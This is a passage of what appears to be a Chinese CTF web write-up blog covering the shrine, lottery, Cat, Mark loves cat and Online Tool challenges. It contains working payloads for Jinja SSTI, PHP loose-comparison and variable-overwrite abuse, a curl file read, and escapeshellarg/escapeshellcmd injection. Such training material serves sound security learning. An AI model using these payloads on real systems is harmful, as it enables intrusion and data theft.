class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<span class="hljs-comment">#将FLAG从环境变量中弹出去，弹出去的FLAG给了app.config字典中FLAG键对应的值，可以用config[&#x27;FLAG&#x27;]访问它，但后面会把config这东西当黑名单过滤掉。</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&#x27;</span></span>)</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>       s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#左括号替换为空，右括号替换为空</span><br>       blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<span class="hljs-comment">#把黑名单里的字符全替换为空，两个%用来转义，否则&#123;&#125;就被当成占位符了。注意这个只替换双括号里的config和self，单个括号没啥影响。</span><br><br>  <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br>  <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure><p>猜测SSTI模板注入，在&#x2F;shrine&#x2F;下尝试49:<br><img src="/img/c2.png" alt="c2"><br>七个七，而且代码里都提了Jinja。<br>对于输入首先过滤了()，然后过滤了config和self这两个关键字。<br>利用<code>/shrine/&#123;&#123;"".__class__.__base__.__base__&#125;&#125;</code>找到了它最大的爹<code>object</code>，再用subclasses找它下面的所有子类：<br><code>&#123;&#123;"".__class__.__base__.__base__.__subclasses__()&#125;&#125;</code><br><img src="/img/c3.png" alt="c3"><br>出了个这种东西就不会做了。感觉自己的知识还是太贫瘠了，一看到SSTI的题就想着判断类型然后找它的爹执行命令，都快成思维定式了。。。而且做题也不细心，既然它把config和self放到了黑名单里，那为什么偏偏放它俩呢？config可能是因为把FLAG直接弹给了它所以过滤，那self为什么过滤？希望以后在学习过程中能克服这些问题。<br>去网上找了下wp看看其它师傅是怎么解的，感谢这位师傅：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/Cl0ud/</span>p/<span class="hljs-number">12316287</span>.html<br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">93746437</span><br></code></pre></td></tr></table></figure><p>如果没有黑名单的化，直接即可访问环境变量中的FLAG，或者用self.<strong>dict</strong> 访问但config和self被黑名单过滤掉了。这时可以使用python内置函数：<code>url_for或者get_flashed_messages</code>读取全局变量<code>current_app</code>。再利用这个<code>current_app</code>访问config字典中FLAG键对应的值。</p><p>payload:<code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;</code></p><h3 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a><strong>lottery</strong></h3><p>进环境发现是个类似猜骰子的东西：注册账号后去花钱猜数，猜对了给钱。当口袋饱饱之后可以买FLAG：</p><p><img src="/img/lo1.png" alt="lo1"></p><p>题目给了个附件，看看都有啥东西：</p><p><img src="/img/lo2.png" alt="lo2"></p><p>直接把所有代码都给了？和钱有关的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$money</span> = <span class="hljs-string">&#x27;$&#x27;</span> . <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>]; <span class="hljs-comment">//money在SESSION变量中？直接burpsuite抓包看看能不能改</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&lt;&lt;&lt;EOT</span><br><span class="hljs-string">&lt;li&gt;Username: <span class="hljs-subst">$name</span>&lt;/li&gt;</span><br><span class="hljs-string">&lt;li&gt;Money: <span class="hljs-subst">$money</span>&lt;/li&gt;</span><br><span class="hljs-string">EOT</span>;<br><br><span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//acount.php</span><br></code></pre></td></tr></table></figure><p>直接去buy界面猜数抓包看看啥情况：</p><p><img src="/img/lo3.png" alt="lo3"></p><p>POST传了<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:&quot;7777777&quot;&#125;</code>，<code>action:buy</code>，<code>numbers</code>后面是我们猜的数字，系统会把数字带进去和<code>&quot;win_numbers&quot;:&quot;8701664&quot;</code>比较，这个<code>win_numbers</code>和比较对错是怎么定义的？找找有没有相关的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">buy</span>(<span class="hljs-params"><span class="hljs-variable">$req</span></span>)</span>&#123;<br><span class="hljs-title function_ invoke__">require_registered</span>();<br><span class="hljs-title function_ invoke__">require_min_money</span>(<span class="hljs-number">2</span>);<br><br><span class="hljs-variable">$money</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>];<br><span class="hljs-variable">$numbers</span> = <span class="hljs-variable">$req</span>[<span class="hljs-string">&#x27;numbers&#x27;</span>];<br><span class="hljs-variable">$win_numbers</span> = <span class="hljs-title function_ invoke__">random_win_nums</span>(); <span class="hljs-comment">//后面那个是生成的七位随机数</span><br><span class="hljs-variable">$same_count</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>&lt;<span class="hljs-number">7</span>; <span class="hljs-variable">$i</span>++)&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$numbers</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$win_numbers</span>[<span class="hljs-variable">$i</span>])&#123;  <span class="hljs-comment">//挺常见的弱相等，若对Numbers无过滤则直接输入布尔True让它和任何非零数字相等</span><br><span class="hljs-variable">$same_count</span>++;<br>&#125;<br>&#125;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$same_count</span>) &#123;   <span class="hljs-comment">//两个及以上相同才会给钱</span><br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">5</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">20</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">300</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">1800</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">200000</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">5000000</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-variable">$prize</span> = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-variable">$money</span> += <span class="hljs-variable">$prize</span> - <span class="hljs-number">2</span>;  <span class="hljs-comment">//每次尝试需要两块钱</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;money&#x27;</span>] = <span class="hljs-variable">$money</span>;<br><span class="hljs-title function_ invoke__">response</span>([<span class="hljs-string">&#x27;status&#x27;</span>=&gt;<span class="hljs-string">&#x27;ok&#x27;</span>,<span class="hljs-string">&#x27;numbers&#x27;</span>=&gt;<span class="hljs-variable">$numbers</span>, <span class="hljs-string">&#x27;win_numbers&#x27;</span>=&gt;<span class="hljs-variable">$win_numbers</span>, <span class="hljs-string">&#x27;money&#x27;</span>=&gt;<span class="hljs-variable">$money</span>, <span class="hljs-string">&#x27;prize&#x27;</span>=&gt;<span class="hljs-variable">$prize</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>PHP的弱相等(&#x3D;&#x3D;)和强相等(&#x3D;&#x3D;&#x3D;)碰见挺多次了，弱相等会在比较之前进行类型转换，转换完了再比较是否相等(可以用布尔、科学计数法等绕过)。强相等会直接比较类型是否相等？内容是否相等?(不过依然可以通过数组方法绕过)。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">下面的总结参考了这位师傅的文章:https://blog.csdn.net/qq_43715020?<span class="hljs-keyword">type</span>=blog <br><br>在php中,如果<span class="hljs-type">bool</span>和&quot;任何其他类型&quot;比较,&quot;任何其他类型&quot;会转换为<span class="hljs-type">bool</span>。<br>在PHP中当转换为 <span class="hljs-type">boolean</span> 时，以下值被认为是 <span class="hljs-keyword">FALSE</span> ：<br>(<span class="hljs-number">1</span>) 布尔值 <span class="hljs-keyword">FALSE</span> 本身<br>(<span class="hljs-number">2</span>) 整型值 <span class="hljs-number">0</span>（零）<br>(<span class="hljs-number">3</span>)浮点型值 <span class="hljs-number">0.0</span>（零）<br>(<span class="hljs-number">4</span>)空字符串，以及字符串 “<span class="hljs-number">0</span>”<br>(<span class="hljs-number">5</span>)不包括任何元素的数组(注意,一旦包含元素,就算包含的元素只是一个空数组,也是<span class="hljs-keyword">true</span>)<br>(<span class="hljs-number">6</span>)不包括任何成员变量的对象（仅 PHP <span class="hljs-number">4.0</span> 适用）<br>(<span class="hljs-number">7</span>)特殊类型 <span class="hljs-keyword">NULL</span>（包括尚未赋值的变量）<br>(<span class="hljs-number">8</span>)从空标记生成的 SimpleXML 对象<br>(<span class="hljs-number">9</span>)所有其它值包括<span class="hljs-number">-1</span>都被认为是 <span class="hljs-keyword">TRUE</span> <br></code></pre></td></tr></table></figure><p>因为是拿数组元素一个一个的比较，那就直接让<code>&quot;numbers&quot;</code>为[true,true,true,true,true,true,true]。</p><p>payload:<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</code></p><p><img src="/img/lo4.png" alt="lo4"></p><p>不过有个问题我还没搞懂：bool的true和false常量是不区分大小写的，但我改成：<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[TRUE,TRUE,TRUE,TRUE,TRUE,TRUE,TRUE]&#125;</code>就给我回显invalid json。。。难道json这东西的一些定义还对大小写有说法？</p><h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>题目描述: 抓住那只猫</p><p><img src="/img/cat1.png" alt="cat1"></p><p>随便输了个loli.club没啥反应，单上面的URL变化了：</p><p><code>/index.php?url=loli.club</code></p><p>GET传参url?看着像存在文件包含漏洞：</p><p>url&#x3D;etc&#x2F;passwd试了半天没啥反应。。用burpsuite抓包看response有个CAT？输个CAT尝试一下：</p><p><img src="/img/cat2.png" alt="cat2"></p><p>执行了ping命令？试试127.0.0.1：</p><p><img src="/img/cat3.png" alt="cat3"></p><p>果然是ping命令，那这题可能是RCE，但&amp;|;均被过滤掉了(提示invalid URL)。。后面不会做了，下面部分内容参考了这位师傅的博客，感谢：<code>https://blog.csdn.net/qq_44065556/article/details/120541298和https://www.cnblogs.com/xyongsec/p/11364520.html</code></p><p>既然有过滤就要看看它过滤了啥没过滤了啥，在框里输入东西后上面的URL会变化：</p><p><code>http://61.147.171.105:53337/index.php?url=127.0.0.1%26ls</code></p><p>直接送到burpsuite里爆破，集束炸弹模式从<code>%00</code>爆到<code>%FF</code>，发现当URL大于%80后会有报错：</p><p><img src="/img/cat4.png" alt="cat4"></p><p><img src="/img/cat5.png" alt="cat5"></p><p>发现有<html>，<head>等标签猜测要改成html后缀？改完后打开：</p><p><img src="/img/cat6.png" alt="cat6"></p><p>这玩意儿是个<code>Django</code>报错界面(感觉有点像今年NSCTF那道题的报错界面)：</p><p><code>illegal multibyte sequence 意思是非法的多字节序列</code></p><p>而GBK这东西面对超过0x7F的时候会用两个字符表示。感觉就是这里出了问题：超过%7F的URL均会把报错。</p><p>而且当 <code>CURLOPT_SAFE_UPLOAD</code> 为 true 时，如果在请求前面加上@的话phpcurl组件是会把后面的当作绝对路径请求，来读取文件。</p><p><img src="/img/cat7.png" alt="cat7"></p><p>接下来有两种方法：一种先找settings.py在找database，另一种直接在报错页面ctrl+f找database:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>api/database.sqlite3<br></code></pre></td></tr></table></figure><p>django项目生成时settings.py会存放在项目目录下再以项目名称命名的文件夹下面:</p><p><code>/opt/api/api/settings.py</code></p><p>进数据库里直接ctrl+F然后找CTF就好了。。不过我做这道题的时候不知道咋回事没法读，一直进的是那页报错信息。。。MD</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>进环境发现是个网页：</p><p><img src="/img/a4.png" alt="a4"></p><p>感觉像是敏感文件泄露的题？先试试&#x2F;.git再用dirsearch扫：</p><p><img src="/img/a5.png" alt="a5"></p><p>有东西，直接上Githack：</p><p><code>python GitHack.py http://af058f36-8fc4-47ff-86be-d9b094d1187b.node4.buuoj.cn/.git/</code></p><p>发现有<code>index.php</code>和<code>flag.php</code>：</p><p><img src="/img/a6.png" alt="a6"></p><p>这里碰了钉子：有时候Githack不知道是扫太快了还是咋回事，无法下载扫出来的文件(比如一开始我就找不到下载的flag.php和index.php)。后来在网上找了半天，大佬说是线程太多的原因，把线程改小就可以不被拒绝访问，方法：</p><p><img src="/img/a7.png" alt="a7"></p><p>这东西本来是10，给改成1就好了。</p><p>(我感觉是我用windows的原因。。？因为之前dirsearch也出现过这种情况，用Linux就正常了)</p><p><img src="/img/a8.png" alt="a8"></p><p>看看他俩有啥东西：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs PHP">index.php:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;  POST传x=y<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>;  <span class="hljs-comment">//变量覆盖,变量(x的值)=y</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123; GET传x=y<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>; <span class="hljs-comment">//同上，变量(x的值)=变量(y的值)</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;  <span class="hljs-comment">//遍历GET传的</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);  <span class="hljs-comment">//终止脚本执行并返回$handsome</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<span class="hljs-comment">//GET、POST均没传flag</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);  <span class="hljs-comment">//终止脚本执行并返回$yds</span><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>); <span class="hljs-comment">//终止脚本执行并返回$is</span><br>&#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br><br>flag.php:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>$flag已经定义，要想办法把$flag搞出来。但通篇只有利用exit去显示$yds、$is、$handsome，和变量覆盖联系一下：是否可以利用变量覆盖直接exit($flag)？</p><p>第二个flag在我看来最好满足：只要GETPOST都不传flag就行了，但是如何exit($flag)？</p><p><code>$yds=$flag</code>  $(x的值)&#x3D;$(y的值)-&gt;GET传<code>yds=flag</code></p><p>payload：<code>/index.php?yds=flag</code></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<span class="hljs-comment">//1.确保用户只传递一个参数给命令。2用户不能指定更多的参数。3.用户不能执行不同的命令。</span><br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<span class="hljs-comment">//1.确保用户只执行一个命令。2.用户可以指定不限数量的参数。3.用户不能执行不同的命令。 这两个函数一起使用会存在漏洞。</span><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;    <span class="hljs-comment">//-T5 : 可以加快或者减慢扫描速度，有六个级别，级别越高速度越快，也越容易被WAF或者IDS发现。-sT：使用TCP Syn扫描最常用的端口，会完整的执行完TCP的三次握手，隐蔽性不强。-Pn：有时候防火墙会禁止ping请求.-PN命令告诉Nmap不用ping远程主机。–host-timeout ：限制每个 IP 地址的扫描时间(单位为秒).-F：要求扫描时(包挺ping扫描)使用小的IP包分段。</span><br></code></pre></td></tr></table></figure><p>看了其它师傅们的wp，问题主要出在连续使用<code>escapeshellarg</code> 和 <code>escapeshellcmd</code>上：同时使用会导致绕过过滤执行命令：</p><p>以下内容参考了X1r0z师傅的博客(我没事就逛计院这位大佬的博客，这师傅太强了)：</p><p><code>https://exp10it.cn/2022/08/buuctf-web-writeup-3/#buuctf-2018online-tool</code></p><blockquote><p>escapeshellarg() 会在单引号之前加上 <code>\</code>, 并在被转义的单引号两边和整个字符串两边加上单引号</p><p>escapeshellcmd() 会在所有的 <code>\</code> 前加上 <code>\</code>, 形成 <code>\\</code>, 并在<strong>不成对</strong>的单引号前加 <code>\</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">123</span> -&gt; <span class="hljs-string">&#x27;123&#x27;</span> -&gt; <span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-comment"># 正常效果</span><br>    <br><span class="hljs-number">123</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;\&#x27; # 最后一个引号不成对, 被转义</span><br><span class="hljs-string"></span><br><span class="hljs-string">123&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; # 所有引号成对, 不转义</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;123&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; # 所有引号成对, 不转义</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/weixin_43952190/article/details/<span class="hljs-number">105846175</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/shinygod/article/details/<span class="hljs-number">123207785</span>?utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>~default~baidujs_baidulandingword~default-<span class="hljs-number">0</span>-<span class="hljs-number">123207785</span>-blog-<span class="hljs-number">105846175</span>.<span class="hljs-number">235</span>^v38^pc_relevant_yljh&amp;spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4242</span>.<span class="hljs-number">1</span>&amp;utm_relevant_index=<span class="hljs-number">3</span><br><br><span class="hljs-attribute">https</span>://exp10it.cn/<span class="hljs-number">2022</span>/<span class="hljs-number">08</span>/buuctf-web-writeup-<span class="hljs-number">3</span>/#buuctf-<span class="hljs-number">2018</span>online-tool<br><br><span class="hljs-attribute">https</span>://blog.csdn.net/xhy18634297976/article/details/<span class="hljs-number">122852540</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6650</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;utm_relevant_index=<span class="hljs-number">2</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/weixin_44077544/article/details/<span 